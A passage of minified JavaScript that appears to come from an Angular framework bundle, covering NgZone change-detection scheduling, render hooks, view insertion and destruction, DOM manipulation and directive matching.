a=super.subscribe({next:i,error:o,complete:s});return e instanceof ze&&e.add(a),a}wrapInTimeout(e){return t=>{let r=this.pendingTasks?.add();setTimeout(()=>{e(t),r!==void 0&&this.pendingTasks?.remove(r)})}}},ht=dm;function md(...n){}function BC(n){let e,t;function r(){n=md;try{t!==void 0&&typeof cancelAnimationFrame=="function"&&cancelAnimationFrame(t),e!==void 0&&clearTimeout(e)}catch{}}return e=setTimeout(()=>{n(),r()}),typeof requestAnimationFrame=="function"&&(t=requestAnimationFrame(()=>{n(),r()})),()=>r()}function o0(n){return queueMicrotask(()=>n()),()=>{n=md}}var Gm="isAngularZone",yd=Gm+"_ID",V1=0,pe=class n{hasPendingMacrotasks=!1;hasPendingMicrotasks=!1;isStable=!0;onUnstable=new ht(!1);onMicrotaskEmpty=new ht(!1);onStable=new ht(!1);onError=new ht(!1);constructor(e){let{enableLongStackTrace:t=!1,shouldCoalesceEventChangeDetection:r=!1,shouldCoalesceRunChangeDetection:i=!1,scheduleInRootZone:o=LC}=e;if(typeof Zone>"u")throw new Y(908,!1);Zone.assertZonePatched();let s=this;s._nesting=0,s._outer=s._inner=Zone.current,Zone.TaskTrackingZoneSpec&&(s._inner=s._inner.fork(new Zone.TaskTrackingZoneSpec)),t&&Zone.longStackTraceZoneSpec&&(s._inner=s._inner.fork(Zone.longStackTraceZoneSpec)),s.shouldCoalesceEventChangeDetection=!i&&r,s.shouldCoalesceRunChangeDetection=i,s.callbackScheduled=!1,s.scheduleInRootZone=o,j1(s)}static isInAngularZone(){return typeof Zone<"u"&&Zone.current.get(Gm)===!0}static assertInAngularZone(){if(!n.isInAngularZone())throw new Y(909,!1)}static assertNotInAngularZone(){if(n.isInAngularZone())throw new Y(909,!1)}run(e,t,r){return this._inner.run(e,t,r)}runTask(e,t,r,i){let o=this._inner,s=o.scheduleEventTask("NgZoneEvent: "+i,e,L1,md,md);try{return o.runTask(s,t,r)}finally{o.cancelTask(s)}}runGuarded(e,t,r){return this._inner.runGuarded(e,t,r)}runOutsideAngular(e){return this._outer.run(e)}},L1={};function Wm(n){if(n._nesting==0&&!n.hasPendingMicrotasks&&!n.isStable)try{n._nesting++,n.onMicrotaskEmpty.emit(null)}finally{if(n._nesting--,!n.hasPendingMicrotasks)try{n.runOutsideAngular(()=>n.onStable.emit(null))}finally{n.isStable=!0}}}function U1(n){if(n.isCheckStableRunning||n.callbackScheduled)return;n.callbackScheduled=!0;function e(){BC(()=>{n.callbackScheduled=!1,hm(n),n.isCheckStableRunning=!0,Wm(n),n.isCheckStableRunning=!1})}n.scheduleInRootZone?Zone.root.run(()=>{e()}):n._outer.run(()=>{e()}),hm(n)}function j1(n){let e=()=>{U1(n)},t=V1++;n._inner=n._inner.fork({name:"angular",properties:{[Gm]:!0,[yd]:t,[yd+t]:!0},onInvokeTask:(r,i,o,s,a,c)=>{if(B1(c))return r.invokeTask(o,s,a,c);try{return s0(n),r.invokeTask(o,s,a,c)}finally{(n.shouldCoalesceEventChangeDetection&&s.type==="eventTask"||n.shouldCoalesceRunChangeDetection)&&e(),a0(n)}},onInvoke:(r,i,o,s,a,c,l)=>{try{return s0(n),r.invoke(o,s,a,c,l)}finally{n.shouldCoalesceRunChangeDetection&&!n.callbackScheduled&&!$1(c)&&e(),a0(n)}},onHasTask:(r,i,o,s)=>{r.hasTask(o,s),i===o&&(s.change=="microTask"?(n._hasPendingMicrotasks=s.microTask,hm(n),Wm(n)):s.change=="macroTask"&&(n.hasPendingMacrotasks=s.macroTask))},onHandleError:(r,i,o,s)=>(r.handleError(o,s),n.runOutsideAngular(()=>n.onError.emit(s)),!1)})}function hm(n){n._hasPendingMicrotasks||(n.shouldCoalesceEventChangeDetection||n.shouldCoalesceRunChangeDetection)&&n.callbackScheduled===!0?n.hasPendingMicrotasks=!0:n.hasPendingMicrotasks=!1}function s0(n){n._nesting++,n.isStable&&(n.isStable=!1,n.onUnstable.emit(null))}function a0(n){n._nesting--,Wm(n)}var vd=class{hasPendingMicrotasks=!1;hasPendingMacrotasks=!1;isStable=!0;onUnstable=new ht;onMicrotaskEmpty=new ht;onStable=new ht;onError=new ht;run(e,t,r){return e.apply(t,r)}runGuarded(e,t,r){return e.apply(t,r)}runOutsideAngular(e){return e()}runTask(e,t,r,i){return e.apply(t,r)}};function B1(n){return $C(n,"__ignore_ng_zone__")}function $1(n){return $C(n,"__scheduler_tick__")}function $C(n,e){return!Array.isArray(n)||n.length!==1?!1:n[0]?.data?.[e]===!0}function H1(n="zone.js",e){return n==="noop"?new vd:n==="zone.js"?new pe(e):n}var ur=class{_console=console;handleError(e){this._console.error("ERROR",e)}},q1=new j("",{providedIn:"root",factory:()=>{let n=V(pe),e=V(ur);return t=>n.runOutsideAngular(()=>e.handleError(t))}});function c0(n,e){return R0(n,e)}function z1(n){return R0(x0,n)}var HC=(c0.required=z1,c0);function G1(){return Km(Xt(),Ge())}function Km(n,e){return new Yi(ln(n,e))}var Yi=(()=>{class n{nativeElement;constructor(t){this.nativeElement=t}static __NG_ELEMENT_ID__=G1}return n})();function qC(n){return(n.flags&128)===128}var zC=function(n){return n[n.OnPush=0]="OnPush",n[n.Default=1]="Default",n}(zC||{}),GC=new Map,W1=0;function K1(){return W1++}function Q1(n){GC.set(n[Od],n)}function fm(n){GC.delete(n[Od])}var u0="__ngContext__";function ss(n,e){Gr(e)?(n[u0]=e[Od],Q1(e)):n[u0]=e}function WC(n){return QC(n[ac])}function KC(n){return QC(n[In])}function QC(n){for(;n!==null&&!fr(n);)n=n[In];return n}var pm;function YC(n){pm=n}function Y1(){if(pm!==void 0)return pm;if(typeof document<"u")return document;throw new Y(210,!1)}var Qm=new j("",{providedIn:"root",factory:()=>Z1}),Z1="ng",Ym=new j(""),Ot=new j("",{providedIn:"platform",factory:()=>"unknown"});var Zm=new j("",{providedIn:"root",factory:()=>Y1().body?.querySelector("[ngCspNonce]")?.getAttribute("ngCspNonce")||null});var J1="h",X1="b";var ZC=!1,ek=new j("",{providedIn:"root",factory:()=>ZC});var Jm=function(n){return n[n.CHANGE_DETECTION=0]="CHANGE_DETECTION",n[n.AFTER_NEXT_RENDER=1]="AFTER_NEXT_RENDER",n}(Jm||{}),jd=new j(""),l0=new Set;function gs(n){l0.has(n)||(l0.add(n),performance?.mark?.("mark_feature_usage",{detail:{feature:n}}))}var Yo=function(n){return n[n.EarlyRead=0]="EarlyRead",n[n.Write=1]="Write",n[n.MixedReadWrite=2]="MixedReadWrite",n[n.Read=3]="Read",n}(Yo||{}),JC=(()=>{class n{impl=null;execute(){this.impl?.execute()}static \u0275prov=W({token:n,providedIn:"root",factory:()=>new n})}return n})(),tk=[Yo.EarlyRead,Yo.Write,Yo.MixedReadWrite,Yo.Read],nk=(()=>{class n{ngZone=V(pe);scheduler=V(os);errorHandler=V(ur,{optional:!0});sequences=new Set;deferredRegistrations=new Set;executing=!1;constructor(){V(jd,{optional:!0})}execute(){this.executing=!0;for(let t of tk)for(let r of this.sequences)if(!(r.erroredOrDestroyed||!r.hooks[t]))try{r.pipelinedValue=this.ngZone.runOutsideAngular(()=>this.maybeTrace(()=>r.hooks[t](r.pipelinedValue),r.snapshot))}catch(i){r.erroredOrDestroyed=!0,this.errorHandler?.handleError(i)}this.executing=!1;for(let t of this.sequences)t.afterRun(),t.once&&(this.sequences.delete(t),t.destroy());for(let t of this.deferredRegistrations)this.sequences.add(t);this.deferredRegistrations.size>0&&this.scheduler.notify(8),this.deferredRegistrations.clear()}register(t){this.executing?this.deferredRegistrations.add(t):(this.sequences.add(t),this.scheduler.notify(7))}unregister(t){this.executing&&this.sequences.has(t)?(t.erroredOrDestroyed=!0,t.pipelinedValue=void 0,t.once=!0):(this.sequences.delete(t),this.deferredRegistrations.delete(t))}maybeTrace(t,r){return r?.run(Jm.AFTER_NEXT_RENDER,t)??t()}static \u0275prov=W({token:n,providedIn:"root",factory:()=>new n})}return n})(),gm=class{impl;hooks;once;snapshot;erroredOrDestroyed=!1;pipelinedValue=void 0;unregisterOnDestroy;constructor(e,t,r,i,o=null){this.impl=e,this.hooks=t,this.once=r,this.snapshot=o,this.unregisterOnDestroy=i?.onDestroy(()=>this.destroy())}afterRun(){this.erroredOrDestroyed=!1,this.pipelinedValue=void 0,this.snapshot=null}destroy(){this.impl.unregister(this),this.unregisterOnDestroy?.()}};function Xm(n,e){!e?.injector&&zP(Xm);let t=e?.injector??V(Jt);return gs("NgAfterNextRender"),ik(n,t,e,!0)}function rk(n,e){if(n instanceof Function){let t=[void 0,void 0,void 0,void 0];return t[e]=n,t}else return[n.earlyRead,n.write,n.mixedReadWrite,n.read]}function ik(n,e,t,r){let i=e.get(JC);i.impl??=e.get(nk);let o=e.get(jd,null,{optional:!0}),s=t?.phase??Yo.MixedReadWrite,a=t?.manualCleanup!==!0?e.get(qm):null,c=new gm(i.impl,rk(n,s),r,a,o?.snapshot(null));return i.impl.register(c),c}var ok=()=>null;function ey(n,e,t=!1){return ok(n,e,t)}var jn=function(n){return n[n.Emulated=0]="Emulated",n[n.None=2]="None",n[n.ShadowDom=3]="ShadowDom",n}(jn||{});var mm=class{changingThisBreaksApplicationSecurity;constructor(e){this.changingThisBreaksApplicationSecurity=e}toString(){return`SafeValue must use [property]=binding: ${this.changingThisBreaksApplicationSecurity} (see ${uP})`}};function ty(n){return n instanceof mm?n.changingThisBreaksApplicationSecurity:n}function XC(n){return n instanceof Function?n():n}var Yr=function(n){return n[n.None=0]="None",n[n.SignalBased=1]="SignalBased",n[n.HasDecoratorInputTransform=2]="HasDecoratorInputTransform",n}(Yr||{}),lr=function(n){return n[n.Important=1]="Important",n[n.DashCase=2]="DashCase",n}(lr||{}),sk;function ny(n,e){return sk(n,e)}function Zo(n,e,t,r,i){if(r!=null){let o,s=!1;fr(r)?o=r:Gr(r)&&(s=!0,r=r[hr]);let a=Un(r);n===0&&t!==null?i==null?ib(e,t,a):_d(e,t,a,i||null,!0):n===1&&t!==null?_d(e,t,a,i||null,!0):n===2?Ek(e,a,s):n===3&&e.destroyNode(a),o!=null&&Dk(e,n,o,t,i)}}function ak(n,e){return n.createText(e)}function ck(n,e,t){n.setValue(e,t)}function eb(n,e,t){return n.createElement(e,t)}function uk(n,e){tb(n,e),e[hr]=null,e[Dn]=null}function lk(n,e,t,r,i,o){r[hr]=i,r[Dn]=e,Bd(n,r,t,1,i,o)}function tb(n,e){e[Kr].changeDetectionScheduler?.notify(10),Bd(n,e,e[mt],2,null,null)}function dk(n){let e=n[ac];if(!e)return Bg(n[fe],n);for(;e;){let t=null;if(Gr(e))t=e[ac];else{let r=e[un];r&&(t=r)}if(!t){for(;e&&!e[In]&&e!==n;)Gr(e)&&Bg(e[fe],e),e=e[kt];e===null&&(e=n),Gr(e)&&Bg(e[fe],e),t=e&&e[In]}e=t}}function hk(n,e,t,r){let i=un+r,o=t.length;r>0&&(t[i-1][In]=e),r<o-un?(e[In]=t[i],$0(t,un+r,e)):(t.push(e),e[In]=null),e[kt]=t;let s=e[cc];s!==null&&t!==s&&nb(s,e);let a=e[kd];a!==null&&a.insertView(n),nm(e),e[te]|=128}function nb(n,e){let t=n[ld],r=e[kt];if(Gr(r))n[te]|=dd.HasTransplantedViews;else{let i=r[kt][Ln];e[Ln]!==i&&(n[te]|=dd.HasTransplantedViews)}t===null?n[ld]=[e]:t.push(e)}function ry(n,e){let t=n[ld],r=t.indexOf(e);t.splice(r,1)}function ym(n,e){if(n.length<=un)return;let t=un+e,r=n[t];if(r){let i=r[cc];i!==null&&i!==n&&ry(i,r),e>0&&(n[t-1][In]=r[In]);let o=id(n,un+e);uk(r[fe],r);let s=o[kd];s!==null&&s.detachView(o[fe]),r[kt]=null,r[In]=null,r[te]&=-129}return r}function rb(n,e){if(!(e[te]&256)){let t=e[mt];t.destroyNode&&Bd(n,e,t,3,null,null),dk(e)}}function Bg(n,e){if(e[te]&256)return;let t=De(null);try{e[te]&=-129,e[te]|=256,e[Zt]&&pg(e[Zt]),pk(n,e),fk(n,e),e[fe].type===1&&e[mt].destroy();let r=e[cc];if(r!==null&&fr(e[kt])){r!==e[kt]&&ry(r,e);let i=e[kd];i!==null&&i.detachView(n)}fm(e)}finally{De(t)}}function fk(n,e){let t=n.cleanup,r=e[ad];if(t!==null)for(let s=0;s<t.length-1;s+=2)if(typeof t[s]=="string"){let a=t[s+3];a>=0?r[a]():r[-a].unsubscribe(),s+=2}else{let a=r[t[s+1]];t[s].call(a)}r!==null&&(e[ad]=null);let i=e[zr];if(i!==null){e[zr]=null;for(let s=0;s<i.length;s++){let a=i[s];a()}}let o=e[cd];if(o!==null){e[cd]=null;for(let s of o)s.destroy()}}function pk(n,e){let t;if(n!=null&&(t=n.destroyHooks)!=null)for(let r=0;r<t.length;r+=2){let i=e[t[r]];if(!(i instanceof Wi)){let o=t[r+1];if(Array.isArray(o))for(let s=0;s<o.length;s+=2){let a=i[o[s]],c=o[s+1];Fn(4,a,c);try{c.call(a)}finally{Fn(5,a,c)}}else{Fn(4,i,o);try{o.call(i)}finally{Fn(5,i,o)}}}}}function gk(n,e,t){return mk(n,e.parent,t)}function mk(n,e,t){let r=e;for(;r!==null&&r.type&168;)e=r,r=e.parent;if(r===null)return t[hr];{let{componentOffset:i}=r;if(i>-1){let{encapsulation:o}=n.data[r.directiveStart+i];if(o===jn.None||o===jn.Emulated)return null}return ln(r,t)}}function _d(n,e,t,r,i){n.insertBefore(e,t,r,i)}function ib(n,e,t){n.appendChild(e,t)}function d0(n,e,t,r,i){r!==null?_d(n,e,t,r,i):ib(n,e,t)}function ob(n,e){return n.parentNode(e)}function yk(n,e){return n.nextSibling(e)}function vk(n,e,t){return wk(n,e,t)}function _k(n,e,t){return n.type&40?ln(n,t):null}var wk=_k,h0;function sb(n,e,t,r){let i=gk(n,r,e),o=e[mt],s=r.parent||e[Dn],a=vk(s,r,e);if(i!=null)if(Array.isArray(t))for(let c=0;c<t.length;c++)d0(o,i,t[c],a,!1);else d0(o,i,t,a,!1);h0!==void 0&&h0(o,r,e,t,i)}function nc(n,e){if(e!==null){let t=e.type;if(t&3)return ln(e,n);if(t&4)return vm(-1,n[e.index]);if(t&8){let r=e.child;if(r!==null)return nc(n,r);{let i=n[e.index];return fr(i)?vm(-1,i):Un(i)}}else{if(t&128)return nc(n,e.next);if(t&32)return ny(e,n)()||Un(n[e.index]);{let r=ab(n,e);if(r!==null){if(Array.isArray(r))return r[0];let i=zi(n[Ln]);return nc(i,r)}else return nc(n,e.next)}}}return null}function ab(n,e){if(e!==null){let r=n[Ln][Dn],i=e.projection;return r.projection[i]}return null}function vm(n,e){let t=un+n+1;if(t<e.length){let r=e[t],i=r[fe].firstChild;if(i!==null)return nc(r,i)}return e[qi]}function Ek(n,e,t){n.removeChild(null,e,t)}function iy(n,e,t,r,i,o,s){for(;t!=null;){if(t.type===128){t=t.next;continue}let a=r[t.index],c=t.type;if(s&&e===0&&(a&&ss(Un(a),r),t.flags|=2),(t.flags&32)!==32)if(c&8)iy(n,e,t.child,r,i,o,!1),Zo(e,n,i,a,o);else if(c&32){let l=ny(t,r),h;for(;h=l();)Zo(e,n,i,h,o);Zo(e,n,i,a,o)}else c&16?Ik(n,e,r,t,i,o):Zo(e,n,i,a,o);t=s?t.projectionNext:t.next}}function Bd(n,e,t,r,i,o){iy(t,r,n.firstChild,e,i,o,!1)}function Ik(n,e,t,r,i,o){let s=t[Ln],c=s[Dn].projection[r.projection];if(Array.isArray(c))for(let l=0;l<c.length;l++){let h=c[l];Zo(e,n,i,h,o)}else{let l=c,h=s[kt];qC(r)&&(l.flags|=128),iy(n,e,l,h,i,o,!0)}}function Dk(n,e,t,r,i){let o=t[qi],s=Un(t);o!==s&&Zo(e,n,r,o,i);for(let a=un;a<t.length;a++){let c=t[a];Bd(c[fe],c,n,e,r,o)}}function Ck(n,e,t,r,i){if(e)i?n.addClass(t,r):n.removeClass(t,r);else{let o=r.indexOf("-")===-1?void 0:lr.DashCase;i==null?n.removeStyle(t,r,o):(typeof i=="string"&&i.endsWith("!important")&&(i=i.slice(0,-10),o|=lr.Important),n.setStyle(t,r,i,o))}}function bk(n,e,t){n.setAttribute(e,"style",t)}function cb(n,e,t){t===""?n.removeAttribute(e,"class"):n.setAttribute(e,"class",t)}function ub(n,e,t){let{mergedAttrs:r,classes:i,styles:o}=t;r!==null&&om(n,e,r),i!==null&&cb(n,e,i),o!==null&&bk(n,e,o)}function Tk(n,e,t){let r=n.length;for(;;){let i=n.indexOf(e,t);if(i===-1)return i;if(i===0||n.charCodeAt(i-1)<=32){let o=e.length;if(i+o===r||n.charCodeAt(i+o)<=32)return i}t=i+1}}var lb="ng-template";function Sk(n,e,t,r){let i=0;if(r){for(;i<e.length&&typeof e[i]=="string";i+=2)if(e[i]==="class"&&Tk(e[i+1].toLowerCase(),t,0)!==-1)return!0}else if(oy(n))return!1;if(i=e.indexOf(1,i),i>-1){let o;for(;++i<e.length&&typeof(o=e[i])=="string";)if(o.toLowerCase()===t)return!0}return!1}function oy(n){return n.type===4&&n.value!==lb}function Ak(n,e,t){let r=n.type===4&&!t?lb:n.value;return e===r}function Mk(n,e,t){let r=4,i=n.attrs,o=i!==null?Nk(i):0,s=!1;for(let a=0;a<e.length;a++){let c=e[a];if(typeof c=="number"){if(!s&&!En(r)&&!En(c))return!1;if(s&&En(c))continue;s=!1,r=c|r&1;continue}if(!s)if(r&4){if(r=2|r&1,c!==""&&!Ak(n,c,t)||c===""&&e.length===1){if(En(r))return!1;s=!0}}else if(r&8){if(i===null||!Sk(n,i,c,t)){if(En(r))return!1;s=!0}}else{let l=e[++a],h=xk(c,i,oy(n),t);if(h===-1){if(En(r))return!1;s=!0;continue}if(l!==""){let p;if(h>o?p="":p=i[h+1].toLowerCase(),r&2&&l!==p){if(En(r))return!1;s=!0}}}}return En(r)||s}function En(n){return(n&1)===0}function xk(n,e,t,r){if(e===null)return-1;let i=0;if(r||!t){let o=!1;for(;i<e.length;){let s=e[i];if(s===n)return i;if(s===3||s===6)o=!0;else if(s===1||s===2){let a=e[++i];for(;typeof a=="string";)a=e[++i];continue}else{if(s===4)break;if(s===0){i+=4;continue}}i+=o?1:2}return-1}else return Pk(e,n)}function Rk(n,e,t=!1){for(let r=0;r<e.length;r++)if(Mk(n,e[r],t))return!0;return!1}function Nk(n){for(let e=0;e<n.length;e++){let t=n[e];if(C1(t))return e}return n.length}function Pk(n,e){let t=n.indexOf(4);if(t>-1)for(t++;t<n.length;){let r=n[t];if(typeof r=="number")return-1;if(r===e)return t;t++}return-1}function f0(n,e){return n?":not("+e.trim()+")":e}function kk(n){let e=n[0],t=1,r=2,i="",o=!1;for(;t<n.length;){let s=n[t];if(typeof s=="string")if(r&2){let a=n[++t];i+="["+s+(a.length>0?'="'+a+'"':"")+"]"}else r&8?i+="."+s:r&4&&(i+=" "+s);else i!==""&&!En(s)&&(e+=f0(o,i),i=""),r=s,o=o||!En(r);t++}return i!==""&&(e+=f0(o,i)),e}function Ok(n){return n.map(kk).join(",")}function Fk(n){let e=[],t=[],r=1,i=2;for(;r<n.length;){let o=n[r];if(typeof o=="string")i===2?o!==""&&e.push(o,n[++r]):i===8&&t.push(o);else{if(!En(i))break;i=o}r++}return{attrs:e,classes:t}}var Zi={};function Xr(n=1){db(dn(),Ge(),fs()+n,!1)}function db(n,e,t,r){if(!r)if((e[te]&3)===3){let o=n.preOrderCheckHooks;o!==null&&Xl(e,o,t)}else{let o=n.preOrderHooks;o!==null&&ed(e,o,0,t)}Gi(t)}function Ie(n,e=le.Default){let t=Ge();if(t===null)return L(n,e);let r=Xt();return kC(r,t,Nt(n),e)}function hb(){let n="invalid";throw new Error(n)}function fb(n,e,t,r,i,o){let s=De(null);try{let a=null;i&Yr.SignalBased&&(a=e[r][Qt]),a!==null&&a.transformFn!==void 0&&(o=a.transformFn(o)),i&Yr.HasDecoratorInputTransform&&(o=n.inputTransforms[r].call(e,o)),n.setInput!==null?n.setInput(e,a,o,t,r):iC(e,a,r,o)}finally{De(s)}}function Vk(n,e){let t=n.hostBindingOpCodes;if(t!==null)try{for(let r=0;r<t.length;r++){let i=t[r];if(i<0)Gi(~i);else{let o=i,s=t[++r],a=t[++r];p1(s,o);let c=e[o];a(2,c)}}}finally{Gi(-1)}}function sy(n,e,t,r,i,o,s,a,c,l,h){let p=e.blueprint.slice();return p[hr]=i,p[te]=r|4|128|8|64|1024,(l!==null||n&&n[te]&2048)&&(p[te]|=2048),lC(p),p[kt]=p[gc]=n,p[ar]=t,p[Kr]=s||n&&n[Kr],p[mt]=a||n&&n[mt],p[rs]=c||n&&n[rs]||null,p[Dn]=o,p[Od]=K1(),p[sd]=h,p[eC]=l,p[Ln]=e.type==2?n[Ln]:p,p}function ay(n,e,t,r,i){let o=n.data[e];if(o===null)o=Lk(n,e,t,r,i),f1()&&(o.flags|=32);else if(o.type&64){o.type=t,o.value=r,o.attrs=i;let s=c1();o.injectorIndex=s===null?-1:s.injectorIndex}return Ud(o,!0),o}function Lk(n,e,t,r,i){let o=fC(),s=pC(),a=s?o:o&&o.parent,c=n.data[e]=zk(n,a,t,e,r,i);return n.firstChild===null&&(n.firstChild=c),o!==null&&(s?o.child==null&&c.parent!==null&&(o.child=c):o.next===null&&(o.next=c,c.prev=o)),c}function pb(n,e,t,r){if(t===0)return-1;let i=e.length;for(let o=0;o<t;o++)e.push(r),n.blueprint.push(r),n.data.push(null);return i}function gb(n,e,t,r,i){let o=fs(),s=r&2;try{Gi(-1),s&&e.length>cr&&db(n,e,cr,!1),Fn(s?2:0,i),t(r,i)}finally{Gi(o),Fn(s?3:1,i)}}function mb(n,e,t){if(nC(e)){let r=De(null);try{let i=e.directiveStart,o=e.directiveEnd;for(let s=i;s<o;s++){let a=n.data[s];if(a.contentQueries){let c=t[s];a.contentQueries(1,c,s)}}}finally{De(r)}}}function Uk(n,e,t){hC()&&(Xk(n,e,t,ln(t,e)),(t.flags&64)===64&&wb(n,e,t))}function jk(n,e,t=ln){let r=e.localNames;if(r!==null){let i=e.index+1;for(let o=0;o<r.length;o+=2){let s=r[o+1],a=s===-1?t(e,n):n[s];n[i++]=a}}}function yb(n){let e=n.tView;return e===null||e.incompleteFirstPass?n.tView=vb(1,null,n.template,n.decls,n.vars,n.directiveDefs,n.pipeDefs,n.viewQuery,n.schemas,n.consts,n.id):e}function vb(n,e,t,r,i,o,s,a,c,l,h){let p=cr+r,m=p+i,y=Bk(p,m),D=typeof l=="function"?l():l;return y[fe]={type:n,blueprint:y,template:t,queries:null,viewQuery:a,declTNode:e,data:y.slice().fill(null,p),bindingStartIndex:p,expandoStartIndex:m,hostBindingOpCodes:null,firstCreatePass:!0,firstUpdatePass:!0,staticViewQueries:!1,staticContentQueries:!1,preOrderHooks:null,preOrderCheckHooks:null,contentHooks:null,contentCheckHooks:null,viewHooks:null,viewCheckHooks:null,destroyHooks:null,cleanup:null,contentQueries:null,components:null,directiveRegistry:typeof o=="function"?o():o,pipeRegistry:typeof s=="function"?s():s,firstChild:null,schemas:c,consts:D,incompleteFirstPass:!1,ssrId:h}}function Bk(n,e){let t=[];for(let r=0;r<e;r++)t.push(r<n?null:Zi);return t}function $k(n,e,t,r){let o=r.get(ek,ZC)||t===jn.ShadowDom,s=n.selectRootElement(e,o);return Hk(s),s}function Hk(n){qk(n)}var qk=()=>null;function zk(n,e,t,r,i,o){let s=e?e.injectorIndex:-1,a=0;return o1()&&(a|=128),{type:t,index:r,insertBeforeIndex:null,injectorIndex:s,directiveStart:-1,directiveEnd:-1,directiveStylingLast:-1,componentOffset:-1,propertyBindings:null,flags:a,providerIndexes:0,value:i,attrs:o,mergedAttrs:null,localNames:null,initialInputs:void 0,inputs:null,outputs:null,tView:null,next:null,prev:null,projectionNext:null,child:null,parent:e,projection:null,styles:null,stylesWithoutHost:null,residualStyles:void 0,classes:null,classesWithoutHost:null,residualClasses:void 0,classBindings:0,styleBindings:0}}function p0(n,e,t,r,i){for(let o in e){if(!e.hasOwnProperty(o))continue;let s=e[o];if(s===void 0)continue;r??={};let a,c=Yr.None;Array.isArray(s)?(a=s[0],c=s[1]):a=s;let l=o;if(i!==null){if(!i.hasOwnProperty(o))continue;l=i[o]}n===0?g0(r,t,l,a,c):g0(r,t,l,a)}return r}function g0(n,e,t,r,i){let o;n.hasOwnProperty(t)?(o=n[t]).push(e,r):o=n[t]=[e,r],i!==void 0&&o.push(i)}function Gk(n,e,t){let r=e.directiveStart,i=e.directiveEnd,o=n.data,s=e.attrs,a=[],c=null,l=null;for(let h=r;h<i;h++){let p=o[h],m=t?t.get(p):null,y=m?m.inputs:null,D=m?m.outputs:null;c=p0(0,p.inputs,h,c,y),l=p0(1,p.outputs,h,l,D);let b=c!==null&&s!==null&&!oy(e)?lO(c,h,s):null;a.push(b)}c!==null&&(c.hasOwnProperty("class")&&(e.flags|=8),c.hasOwnProperty("style")&&(e.flags|=16)),e.initialInputs=a,e.inputs=c,e.outputs=l}function Wk(n){return n==="class"?"className":n==="for"?"htmlFor":n==="formaction"?"formAction":n==="innerHtml"?"innerHTML":n==="readonly"?"readOnly":n==="tabindex"?"tabIndex":n}function Kk(n,e,t,r,i,o,s,a){let c=ln(e,t),l=e.inputs,h;!a&&l!=null&&(h=l[r])?(uy(n,t,h,r,i),Fd(e)&&Qk(t,e.index)):e.type&3?(r=Wk(r),i=s!=null?s(i,e.value||"",r):i,o.setProperty(c,r,i)):e.type&12}function Qk(n,e){let t=Jr(e,n);t[te]&16||(t[te]|=64)}function Yk(n,e,t,r){if(hC()){let i=r===null?null:{"":-1},o=tO(n,t),s,a;o===null?s=a=null:[s,a]=o,s!==null&&_b(n,e,t,s,i,a),i&&nO(t,r,i)}t.mergedAttrs=uc(t.mergedAttrs,t.attrs)}function _b(n,e,t,r,i,o){for(let l=0;l<r.length;l++)cm(gd(t,e),n,r[l].type);iO(t,n.data.length,r.length);for(let l=0;l<r.length;l++){let h=r[l];h.providersResolver&&h.providersResolver(h)}let s=!1,a=!1,c=pb(n,e,r.length,null);for(let l=0;l<r.length;l++){let h=r[l];t.mergedAttrs=uc(t.mergedAttrs,h.hostAttrs),oO(n,t,e,c,h),rO(c,h,i),h.contentQueries!==null&&(t.flags|=4),(h.hostBindings!==null||h.hostAttrs!==null||h.hostVars!==0)&&(t.flags|=64);let p=h.type.prototype;!s&&(p.ngOnChanges||p.ngOnInit||p.ngDoCheck)&&((n.preOrderHooks??=[]).push(t.index),s=!0),!a&&(p.ngOnChanges||p.ngDoCheck)&&((n.preOrderCheckHooks??=[]).push(t.index),a=!0),c++}Gk(n,t,o)}function Zk(n,e,t,r,i){let o=i.hostBindings;if(o){let s=n.hostBindingOpCodes;s===null&&(s=n.hostBindingOpCodes=[]);let a=~e.index;Jk(s)!=a&&s.push(a),s.push(t,r,o)}}function Jk(n){let e=n.length;for(;e>0;){let t=n[--e];if(typeof t=="number"&&t<0)return t}return 0}function Xk(n,e,t,r){let i=t.directiveStart,o=t.directiveEnd;Fd(t)&&sO(e,t,n.data[i+t.componentOffset]),n.firstCreatePass||gd(t,e),ss(r,e);let s=t.initialInputs;for(let a=i;a<o;a++){let c=n.data[a],l=is(e,n,a,t);if(ss(l,e),s!==null&&uO(e,a-i,l,c,t,s),Qr(c)){let h=Jr(t.index,e);h[ar]=is(e,n,a,t)}}}function wb(n,e,t){let r=t.directiveStart,i=t.directiveEnd,o=t.index,s=g1();try{Gi(o);for(let a=r;a<i;a++){let c=n.data[a],l=e[a];im(a),(c.hostBindings!==null||c.hostVars!==0||c.hostAttrs!==null)&&eO(c,l)}}finally{Gi(-1),im(s)}}function eO(n,e){n.hostBindings!==null&&n.hostBindings(1,e)}function tO(n,e){let t=n.directiveRegistry,r=null,i=null;if(t)for(let o=0;o<t.length;o++){let s=t[o];if(Rk(e,s.selectors,!1))if(r||(r=[]),Qr(s))if(s.findHostDirectiveDefs!==null){let a=[];i=i||new Map,s.findHostDirectiveDefs(s,a,i),r.unshift(...a,s);let c=a.length;_m(n,e,c)}else r.unshift(s),_m(n,e,0);else i=i||new Map,s.findHostDirectiveDefs?.(s,r,i),r.push(s)}return r===null?null:[r,i]}function _m(n,e,t){e.componentOffset=t,(n.components??=[]).push(e.index)}function nO(n,e,t){if(e){let r=n.localNames=[];for(let i=0;i<e.length;i+=2){let o=t[e[i+1]];if(o==null)throw new Y(-301,!1);r.push(e[i],o)}}}function rO(n,e,t){if(t){if(e.exportAs)for(let r=0;r<e.exportAs.length;r++)t[e.exportAs[r]]=n;Qr(e)&&(t[""]=n)}}function iO(n,e,t){n.flags|=1,n.directiveStart=e,n.directiveEnd=e+t,n.providerIndexes=e}function oO(n,e,t,r,i){n.data[r]=i;let o=i.factory||(i.factory=Hi(i.type,!0)),s=new Wi(o,Qr(i),Ie);n.blueprint[r]=s,t[r]=s,Zk(n,e,r,pb(n,t,i.hostVars,Zi),i)}function Eb(n){let e=16;return n.signals?e=4096:n.onPush&&(e=64),e}function sO(n,e,t){let r=ln(e,n),i=yb(t),o=n[Kr].rendererFactory,s=cy(n,sy(n,i,null,Eb(t),r,e,null,o.createRenderer(r,t),null,null,null));n[e.index]=s}function aO(n,e,t,r,i,o){let s=ln(n,e);cO(e[mt],s,o,n.value,t,r,i)}function cO(n,e,t,r,i,o,s){if(o==null)n.removeAttribute(e,i,t);else{let a=s==null?Pm(o):s(o,r||"",i);n.setAttribute(e,i,a,t)}}function uO(n,e,t,r,i,o){let s=o[e];if(s!==null)for(let a=0;a<s.length;){let c=s[a++],l=s[a++],h=s[a++],p=s[a++];fb(r,t,c,l,h,p)}}function lO(n,e,t){let r=null,i=0;for(;i<t.length;){let o=t[i];if(o===0){i+=4;continue}else if(o===5){i+=2;continue}if(typeof 